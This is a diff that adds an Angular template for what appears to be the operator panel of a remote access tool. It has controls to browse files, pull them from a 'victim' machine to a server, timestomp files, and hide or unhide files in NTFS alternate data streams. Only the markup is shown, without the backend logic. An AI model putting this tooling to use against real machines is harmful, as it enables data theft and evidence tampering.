@@ -1,0 +1,154 @@
+<div class="message-container" id="messageContainer" *ngIf="message !== ''"
+    [ngStyle]="{'border': isError ? '2px solid red' : '2px solid green'}">
+    <p class="message" *ngIf="message !== ''">{{ message }}</p>
+</div>
+<div class="popup" *ngIf="uploadFilePopup">
+  <div class="popup-content">
+    <div class="custom-header">
+      Upload File
+    </div>
+    <div class="custom-content">
+      <label for="uploadFilePath">Server File Path to Upload</label>
+      <input class="form-control mb-2" type="text" [(ngModel)]="uploadFilePath" placeholder="File Path">  
+    </div>
+    <div class="d-flex justify-content-center align-items-center"> 
+      <button class="text-center btn btn-danger p-2" style="margin-right: 5px;" (click)="closeUploadFilePopup()">Close</button>
+      <button class="text-center btn btn-primary p-2"  (click)="uploadFileFinal()">Upload</button>
+    </div>
+  </div>
+</div>
+
+
+<header>
+  <div class="header-content">
+    <!-- <h1>{{ indexPath }}</h1> -->
+    <a class="btn btn-primary p-2" style="margin-right: 10px;" href="/">Home</a>  
+    <div class="search-container">
+      <input type="text" style="background-color: #2196F3; color: white; border: 1px solid #2196F3;" placeholder="Search" [(ngModel)]="indexPath" [size]="calculateInputSize()">
+      <button class="btn btn-primary" (click)="search()">Search</button>
+    </div>
+  </div>
+</header>
+
+<div class="bodyMadafak" style="height: 100%;">
+  <div style="margin-top: 4rem;">
+    <div class="d-flex justify-content-end actions" style="margin-top: 5.75rem;">
+      <button class="btn btn-primary py-2 px-4" (click)="uploadFile()" style="margin-right: 10px;">Upload File</button>
+      <button class="btn btn-primary py-2 px-4" (click)="downloadFile()">Download File</button>
+      <button class="btn btn-warning py-2 px-4 text-white" (click)="timestomping()" style="margin-left: 10px;">TimeStomping</button>
+      <button class="btn btn-warning py-2 px-4 text-white" (click)="hideFile()" style="margin-left: 10px;">Hide File</button>
+      <button class="btn btn-warning py-2 px-4 text-white" (click)="unhideFile()" style="margin-left: 10px;">Unhide File</button>
+    </div>
+    <main class="d-flex justify-content-center align-items-center ml-3" style="flex-wrap: wrap;">
+      <div class="shadow element d-flex flex-column justify-content-center align-items-center mx-2 p-2" *ngFor="let file of files" (click)="clickFile(file)" >
+        <p style="color: gray;" class="mb-3 text-center">{{ file }}</p>
+        <img src="assets/img/file.jpg" alt="file" class="mb-3" style="width: 70px; height: 75px;">
+      </div>
+    
+      <div class="shadow element d-flex flex-column justify-content-center align-items-center mx-2" *ngFor="let folder of directories" (click)="clickFolder(folder)">
+        <p style="color: gray;" class="text-center">{{ folder }}</p>
+        <img src="assets/img/folder.jpg" alt="folder" style="width: 115px; height: 115px;">
+      </div>
+    </main>
+  </div>
+
+  <div class="overlay" *ngIf="loading"></div>
+  <!-- Loading spinner -->
+  <div class="spinner-container" *ngIf="loading">
+    <div class="spinner-border" role="status">
+      <span class="sr-only">Loading...</span>
+    </div>
+  </div>
+
+
+  <div class="popup" *ngIf="fileContent !== ''">
+    <div class="popup-content">
+      <span class="close-popup" (click)="closePopup()">&times;</span>
+      <div class="custom-header">
+        {{fileName}}
+      </div>
+      <div class="custom-content">
+        <pre class="custom-content2">{{ fileContent }}</pre> 
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="popup" *ngIf="downloadFilePopup">
+  <div class="popup-content">
+    <div class="custom-header">
+      Download File
+    </div>
+    <div class="custom-content">
+      <label for="downloadFilePath">Victim File Path to Download</label>
+      <input class="form-control mb-2" type="text" [(ngModel)]="downloadFilePath" placeholder="File Path">
+      <label for="downloadFileUrl">Server URL from Victim to reach Server</label>
+      <input class="form-control mb-2" type="text" [(ngModel)]="downloadFileUrl" placeholder="Server URL">
+      <div class="d-flex justify-content-center align-items-center"> 
+        <button class="text-center btn btn-danger p-2" style="margin-right: 5px;" (click)="closeDownloadFilePopup()">Close</button>
+        <button class="text-center btn btn-primary p-2"  (click)="downloadFileFinal()">Download</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<div class="popup" *ngIf="hideFilePopup">
+  <div class="popup-content text-center">
+    <div class="custom-header">
+      Hide File
+    </div>
+    <div class="custom-content">
+      <label for="hideFilePath">File Path to Hide</label>
+      <input style="width: 400px !important" class="form-control mb-2" type="text" [(ngModel)]="fileToHide" placeholder="File Path">  
+      <label for="hideFileOutputPath">File to Store Hidden File Path</label>
+      <input style="width: 400px !important" class="form-control mb-2" type="text" [(ngModel)]="dstFileToHide" placeholder="File Path">
+      <label for="hideFileOutputPath">ADS Name</label>
+      <input style="width: 400px !important" class="form-control mb-2" type="text" [(ngModel)]="adsName" placeholder="ADS Name">
+    </div>
+    <div class="d-flex justify-content-center align-items-center"> 
+      <button class="text-center btn btn-danger p-2" style="margin-right: 5px;" (click)="closeHideFilePopup()">Close</button>
+      <button class="text-center btn btn-primary p-2"  (click)="hideFileFinal()">Hide</button>
+    </div>
+  </div>
+</div>
+
+<div class="popup" *ngIf="unhideFilePopup">
+  <div class="popup-content text-center">
+    <div class="custom-header">
+      Unhide File
+    </div>
+    <div class="custom-content">
+      <label for="unhideFilePath">File Path to Unhide</label>
+      <input style="width: 400px !important" class="form-control mb-2" type="text" [(ngModel)]="fileToUnhide" placeholder="File Path">
+      <label for="unhideFileOutputPath">File to Store Unhidden File Path</label>
+      <input style="width: 400px !important" class="form-control mb-2" type="text" [(ngModel)]="dstFileToUnhide" placeholder="File Path">
+      <label for="unhideFileOutputPath">ADS Name</label>
+      <input style="width: 400px !important" class="form-control mb-2" type="text" [(ngModel)]="adsName" placeholder="ADS Name">
+    </div>
+    <div class="d-flex justify-content-center align-items-center"> 
+      <button class="text-center btn btn-danger p-2" style="margin-right: 5px;" (click)="closeUnhideFilePopup()">Close</button>
+      <button class="text-center btn btn-primary p-2"  (click)="unhideFileFinal()">Unhide</button>
+    </div>
+  </div>
+</div>
+
+<div class="popup" *ngIf="timeStompingPopup">
+  <div class="popup-content">
+    <div class="custom-header text-center">
+      TimeStomping
+    </div>
+    <div class="custom-content" style="padding: 10px !important;">
+      <label for="timestompingFilePath">Enter the original timestamp file path</label>
+      <input style="width: 400px !important;" class="form-control mb-2" type="text" [(ngModel)]="timestompingOriginalFile" placeholder="File Path">
+      <label for="timestompingNewFilePath">Enter the destination timestamp file path</label>
+      <input style="width: 400px !important;"  class="form-control mb-2" type="text" [(ngModel)]="timestompingDestinationFile" placeholder="File Path">
+      <div class="d-flex justify-content-center align-items-center"> 
+        <button class="text-center btn btn-danger p-2" style="margin-right: 5px;" (click)="closeTimestompingPopup()">Close</button>
+        <button class="text-center btn btn-primary p-2" (click)="timestompingFinal()">Confirm</button>
+      </div>
+    </div>
+  </div>
+
+  
+
